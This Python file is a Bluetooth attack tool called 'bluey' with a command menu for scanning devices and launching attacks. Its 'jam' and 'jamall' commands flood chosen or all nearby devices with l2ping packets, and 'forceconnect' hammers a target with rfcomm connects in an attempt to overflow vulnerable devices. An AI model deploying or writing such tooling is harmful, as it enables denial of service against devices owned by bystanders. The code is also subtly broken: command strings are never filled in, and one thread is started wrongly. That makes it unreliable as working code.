import os
from bluetooth import *
import art
import subprocess
from alive_progress import alive_bar
import time
from threading import Thread

blocked_addr = []

art.tprint("bluey")
print("=====================================")
print("Author: Logan Goins\n")
print("I am not responsible for any damages or misuse from this software.\nThis software is used at your own risk\n")


def jam_raw():
    subprocess.check_output("sudo l2ping -i {interface} -s {packetsize} -f {target}}".split(" "))



def scan():

    try:
        
        print("Scanning for devices...")

        nearby_devices = discover_devices(lookup_names = True)
        

        print(" ")
        print("        Devices:\n")
        print("============================================")
        for name, addr in nearby_devices:
            print (" > %s - %s" % (addr, name))
            

        print(" \n")
        print("============================================")
        print ("found %d devices" % len(nearby_devices))
        print(" ")
    except OSError as error:
        print(error)
        print("Make sure your bluetooth adapter is up and connected")
        main()
        

def force_connect(target):
    if target == " ":
        print("Target MAC not set")
        main()

    print("attempting connection")
    connect=['rfcomm', 'connect', target, '1']
    items = range(1001)
    with alive_bar(len(items)) as bar:
        for item in items:   
            subprocess.call(connect)
            bar()

def passive_prevent(target):
    if target not in blocked_addr:
        subprocess.check_output("sudo l2ping -i {interface} -s {packetsize} -f {target}}".split(" "))

def passive_scan():
    try:
        
        if interface == " ":
            print("Bluetooth Interface not set")
            main()
        if packetsize == " ":
            print("Packet size not set")
            main()
        

        os.system("clear")

        threads = []


        while True:       
            nearby_devices = discover_devices(lookup_names=True)
            
            print(" ")
        
            for name, addr in nearby_devices:
                print("Blocked devices:")
                print (" > %s - %s" % (addr, name))
                threads.append(Thread(target=passive_prevent, args=(addr,)))               
                threads[-1].start()
                blocked_addr.append(addr)


            print(" \n")
            print(" ")
            
            # Wait for threads to finish
            for thread in threads:
                thread.join()

        
    except OSError as error:
        print(error)
        print("Make sure your bluetooth adapter is up and connected")
        main()


def jam():

    threads = []

    if interface == " ":
        print("Bluetooth Interface not set")
        main()
    if packetsize == " ":
        print("Packet size not set")
        main()
    if target == " ":
        print("target not set")
        main()

    print("Starting packet flow")
    subprocess.check_output("sudo l2ping -i {interface} -s {packetsize} -f {target}}".split(" "))
    threads.append(Thread(target=jam_raw()))               
    threads[-1].start()

def help_menu():
    print(" \n")
    print("Commands")
    print("--------------------------")
    print("scan                         ---  scans for bluetooth devices in the area")
    print("jam                          ---  jams devices using specified interface, target, and packet size")
    print("forceconnect                 ---  tries to cause a buffer overflow connection on vulnerable devices")
    print("set target <target>          ---  sets target MAC address for later use")
    print("set interface <interface>    ---  sets bluetooth interface for use")
    print("set packetsize <packet size> ---  sets packet size for use with the \"jam\" command (in bytes)")
    print("clear                        ---  clears terminal window")
    print("jamall                       ---  jam all devices as soon as detecting")
    print(" ")


def main():
    while True:
        prompt = "\nbluey/> "
        print(prompt, end="")

        command = input().split(" ")
        print(" ")
        if len(command) >= 3:
            cmd = command[0]
            subcmd = command[1]
            arg = command[2]
            params = [cmd, subcmd, arg]
        elif len(command) >= 2:
            cmd = command[0]
            subcmd = command[1]
            params = [cmd, subcmd]

        elif len(command) >= 1:
            cmd = command[0]
            params = [cmd]


        if cmd == "scan":
            scan()

        if cmd == "set" and subcmd == "target":
            global target
            target = arg
            print(target + " ---> target\n")

        if cmd == "jam":
            jam()

        if cmd == "set" and subcmd == "packetsize":
            global packetsize
            packetsize = arg
            print(packetsize + " ---> packet size\n")

        if cmd == "set" and subcmd == "interface" :
            global interface
            interface = arg
            print(interface + " ---> bluetooth interface\n")

        if cmd == "forceconnect":
            force_connect(target)

        if cmd == "jamall":
            passive_scan()

        if cmd == "help":
            help_menu()
        
        if cmd == "clear":
            os.system("clear")

        if cmd == "exit" or cmd == "quit":
            exit()


if __name__ == "__main__":
    main()
